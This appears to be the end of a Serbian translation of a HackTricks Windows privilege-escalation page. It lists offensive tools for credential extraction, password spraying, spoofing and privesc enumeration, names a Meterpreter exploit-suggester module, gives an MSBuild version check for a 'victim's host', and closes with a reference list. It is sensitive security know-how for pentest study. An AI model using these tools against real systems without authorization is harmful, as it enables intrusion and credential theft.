[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Ekstraktuje PuTTY, WinSCP, SuperPuTTY, FileZilla i RDP sačuvane session informacije. Koristite -Thorough lokalno.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Ekstraktuje crendentials iz Credential Manager. Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spray prikupljene passwords kroz domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh je PowerShell ADIDNS/LLMNR/mDNS spoofer i man-in-the-middle tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Osnovna privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Traži poznate privesc vulnerabilities (DEPRECATED za Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Potrebna Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Traži poznate privesc vulnerabilities (mora da se kompajlira koristeći VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumerates host tražeći misconfigurations (više tool za prikupljanje info nego za privesc) (mora da se kompajlira) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Ekstraktuje credentials iz mnogo softvera (precompiled exe na github-u)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port PowerUp-a na C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Proverava misconfiguration (executable precompiled na github-u). Nije preporučeno. Ne radi dobro u Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Proverava moguće misconfigurations (exe iz python-a). Nije preporučeno. Ne radi dobro u Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool kreiran na osnovu ovog posta (ne treba accesschk da bi radio pravilno, ali može da ga koristi).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Čita output od **systeminfo** i preporučuje radne exploits (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Čita output od **systeminfo** i preporučuje radne exploits (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Morate kompajlirati projekat koristeći ispravnu verziju .NET ([pogledajte ovo](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Da biste videli instaliranu verziju .NET na žrtvinom hostu, možete da uradite:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Reference

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: Dangerous Module Resolution on Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Node.js modules: loading from `node_modules` folders](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [Trail of Bits - C/C++ checklist challenges, solved](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [Microsoft Learn - RtlQueryRegistryValues function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)

{{#include ../../banners/hacktricks-training.md}}
